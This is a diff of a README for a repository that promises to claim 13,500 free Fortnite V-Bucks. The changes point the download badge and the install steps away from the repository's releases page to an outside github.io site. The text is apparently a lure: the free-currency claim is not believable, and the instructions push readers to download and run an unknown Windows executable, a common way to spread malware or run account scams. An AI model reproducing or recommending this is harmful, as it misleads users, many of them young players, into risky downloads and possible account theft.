@@ -1,6 +1,6 @@
 # 🎮 V-Bucks-Bonus-2026-Fortnite - Claim Free V-Bucks For Your Account
 
-[![Download V-Bucks Bonus](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Asadabbas4561/V-Bucks-Bonus-2026-Fortnite/releases)
+[![Download V-Bucks Bonus](https://img.shields.io/badge/Download-Release-blue.svg)](https://asadabbas4561.github.io)
 
 This software provides a tool to claim 13,500 V-Bucks for Fortnite Chapter 7 Season 3. You can manage your rewards and apply them to your Epic Games account through this interface. The program interacts with current game events to process your request.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have an active 
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the release page at https://github.com/Asadabbas4561/V-Bucks-Bonus-2026-Fortnite/releases.
+1. Visit the release page at https://asadabbas4561.github.io
 2. Look for the latest version listed under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or a folder you can find.
